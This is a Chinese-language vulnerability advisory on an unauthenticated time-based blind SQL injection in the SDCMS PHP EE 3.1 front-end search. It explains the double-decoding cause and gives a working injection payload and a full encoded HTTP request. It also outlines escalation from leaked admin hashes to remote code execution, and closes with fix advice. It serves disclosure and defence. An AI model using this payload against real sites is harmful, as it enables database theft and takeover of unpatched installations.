漏洞类型： SQL 注入（时间盲注）  
影响版本： SDCMS PHP EE 3.1  
触发入口： `/?m=search`  
权限要求： 前台匿名访问  
测试环境： PHP 7.4.3、MySQL 5.7.26  
验证状态： 本地复现成功，厂商已于 2026-11-08 发布新版本修复。

## 1. 漏洞概述

SDCMS PHP EE 3.1 的前台搜索功能存在 SQL 注入。用户提交的 `keyword` 经过参数处理后，被直接拼接到 SQL 查询语句中。攻击者无需登录即可构造特殊输入，通过响应时间判断 SQL 查询结果。

## 2. 漏洞分析

漏洞位于 `app/home/controller/other.php` 的 `search()` 方法：

```php
$where  = "islock=1";
$where .= " and (";
$where .= " title like '%{$keyword}%' or intro like '%{$keyword}%' ";
$where .= ")";

$rs = $this->db->row(
    "select id from sd_content $join where $where order by id desc limit 1"
);
```

`$keyword` 被直接放入 `LIKE` 条件中，随后作为 SQL 语句的一部分交给数据库执行。这里没有使用预处理语句，也没有通过参数绑定传递搜索内容。

前台搜索走"先存后取"的两步流程，SQL 查询发生在第二步。

1、POST 保存关键词。搜索表单以 POST 提交，程序先在入口对所有请求参数统一转义，再由 F() 取出 keyword，交给 filter_html() 与 enhtml() 处理。enhtml() 内部先执行一次 urldecode()，再做 htmlspecialchars() 特殊字符转义。控制器随后又对 keyword 执行一次 urldecode()，把结果写入 Session，并以 302 跳转到搜索页。整个 POST 过程没有数据库查询。

2、GET 执行查询。浏览器跟随 302 发起 GET 请求，URL 中不再携带 keyword。程序从 Session 取出先前保存的关键词，再执行一次 urldecode()，随后拼入搜索语句。延迟出现在这一请求上，单独重放 POST 数据包只会得到 302 响应。

漏洞成因在于转义与解码的先后顺序。服务端对参数做了三次 URL 解码：PHP 表单解析、enhtml() 中的 urldecode()、控制器中的 urldecode()。入口的转义和 htmlspecialchars() 都夹在解码链条中间，此时引号仍处于编码状态，到达 htmlspecialchars() 时表现为 %27，没有引号字符可供转义。控制器最后一次 urldecode() 才把 %27 还原成单引号，闭合 LIKE 条件中的字符串，后续内容由此成为 SQL 语句的一部分。

在这个SQL注入漏洞中，关键词会被拼进三条 SQL：控制器的探测查询，以及模板的计数查询和列表查询。注入的 sleep() 会在这几条查询里多次执行，执行次数取决于表里 islock=1 的行数。已发布内容越多，数据库需要检查的行数就越多，延迟随之线性增长。

## 3. 漏洞验证

### 前置条件

搜索语句包含 `islock=1`（文章状态已发布），本次时间盲注测试时，`sd_content` 表中需要存在符合条件的已发布内容。全新安装默认没有相关记录，需要管理员手动添加一条内容记录。

### 时间盲注

在前台搜索框提交下面的 payload，或抓包后用 Burp Suite 修改请求。浏览器提交表单时会自动再编码一层，所以搜索框里填的是两层编码形式:

```sql
%2527 and if(1=1,sleep(2),0)=0 ) limit 1 #
```

或者用 Burp Suite 发送以下请求：先从搜索页表单中取出隐藏的 token 字段填入，再携带同一 Cookie 跟随 302 跳转后的 GET 请求，观察该请求的响应时间。

```http
POST /?m=search HTTP/1.1
Host: <Target>
Content-Type: application/x-www-form-urlencoded
Content-Length: 153
Cookie: PHPSESSID=<Your_SESSION_ID>
Connection: close

c=other&a=search&token=<Your_TOKEN>&keyword=%252527%252520and%252520if%2525281%25253D1%25252Csleep%2525282%252529%25252C0%252529%25253D0%252520%252529%252520limit%2525201%252520%252523
```

## 4. 影响范围

权限要求： 未登录用户即可触发该注入，无需任何账号权限。

受影响版本： SDCMS PHP EE 3.1（已在 3.2 版本修复）

受影响组件： 前台搜索功能（/?m=search）

受影响数据层： 数据库敏感信息，包括 sd_admin（管理员密码哈希）、sd_user（会员信息）、sd_config（支付、云存储等配置）。

危害升级路径： 该漏洞的直接后果是敏感数据泄露。若管理员使用弱口令，攻击者可通过离线破解获取明文密码并登录后台；由于该 CMS 后台允许直接编辑模板文件并写入 PHP 代码，攻击者可借此实现远程代码执行（RCE）。

## 5. 修复建议

**使用预处理语句和参数绑定。** 将用户输入作为查询参数传递，避免通过字符串拼接构造 SQL 语句。输入过滤和黑名单机制不应作为 SQL 注入的主要防御手段。

**规范输入解码流程。** 明确 HTTP 参数解析与应用层数据处理的边界，避免对已解析的参数重复 URL 解码，防止转义处理失效。

## 6. 修复情况

厂商在收到反馈后，于 2026 年 11 月 8 日发布了新版本修复了该问题。本文公开时，新版本已可下载。
